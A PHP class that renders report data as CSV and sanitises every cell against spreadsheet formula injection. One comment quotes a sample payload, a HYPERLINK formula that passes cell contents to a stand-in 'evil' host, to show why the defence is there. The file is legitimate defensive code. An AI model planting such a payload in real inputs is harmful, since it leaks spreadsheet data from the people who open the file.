<?php

namespace App\Reports\Renderers;

use App\Reports\ReportDataset;

/**
 * Flat CSV: one header row, then one row per data row.
 *
 * The header row MUST be line 1 — spreadsheets and scripts that consume this
 * file assume the first row is the column header, and a leading title row
 * would shift that assumption and break auto-filter/sort. So the title and
 * meta (the applied filters) are appended as a footer block after the data
 * instead of prepended before it.
 *
 * Sections are deliberately ignored — a spreadsheet cannot filter stacked
 * tables, so a multi-section report flattens to one row per subject with every
 * metric as its own column. Written through fputcsv so a product name
 * containing a comma or a quote cannot shift the remaining columns.
 *
 * `dataset->columnFormats` is also deliberately ignored: it is a display
 * instruction for the PDF, and row values are already raw numbers by
 * contract, so a numeric column lands here unquoted and summable instead of
 * as a formatted string like "72,000.00" that spreadsheets read as text.
 */
class CsvReportRenderer
{
    /** @param array<string,string> $meta filter summary, appended as a footer */
    public function render(ReportDataset $dataset, string $title, array $meta): string
    {
        $handle = fopen('php://temp', 'r+');

        $this->putRow($handle, array_values($dataset->columns));

        foreach ($dataset->rows as $row) {
            $line = [];
            foreach (array_keys($dataset->columns) as $key) {
                $line[] = $row[$key] ?? '';
            }
            $this->putRow($handle, $line);
        }

        if ($dataset->summary !== []) {
            $this->putRow($handle, []);
            foreach ($dataset->summary as $label => $value) {
                $this->putRow($handle, [$label, $value]);
            }
        }

        if ($dataset->notes !== []) {
            $this->putRow($handle, []);
            foreach ($dataset->notes as $note) {
                $this->putRow($handle, [$note]);
            }
        }

        $this->putRow($handle, []);
        $this->putRow($handle, [$title]);
        foreach ($meta as $label => $value) {
            $this->putRow($handle, [$label, $value]);
        }

        rewind($handle);
        $csv = stream_get_contents($handle);
        fclose($handle);

        return $csv;
    }

    /**
     * Every cell goes out through here, so nothing reaches the file without
     * the formula check below — including the header labels, the summary and
     * the footer, which carry report titles and filter values.
     *
     * @param array<int,mixed> $cells
     */
    private function putRow($handle, array $cells): void
    {
        fputcsv($handle, array_map([$this, 'neutralize'], $cells));
    }

    /**
     * Defuse a cell that a spreadsheet would execute rather than display.
     *
     * Excel and Sheets treat a leading =, +, - or @ as the start of a formula,
     * and these cells are not all trusted input: UserActivityReport writes
     * `username_attempt`, which is verbatim whatever string was typed at the
     * login form, and product, location and category names are user-entered
     * too. A failed login as `=HYPERLINK("http://evil/"&A1,"click")` becomes a
     * live link the moment an admin opens the CSV. The leading apostrophe is
     * the standard defusal — spreadsheets strip it on display.
     *
     * Numbers are deliberately left alone. This file's contract is that a
     * numeric column lands unquoted and summable, and a negative figure — a
     * net adjustment, a remaining capacity — legitimately starts with '-'.
     */
    private function neutralize(mixed $value): mixed
    {
        if (! is_string($value) || $value === '' || is_numeric($value)) {
            return $value;
        }

        // Tab and carriage return are here because a leading one of either
        // lets the following character start the formula instead.
        return preg_match('/^[=+\-@\t\r]/', $value) === 1 ? "'" . $value : $value;
    }
}
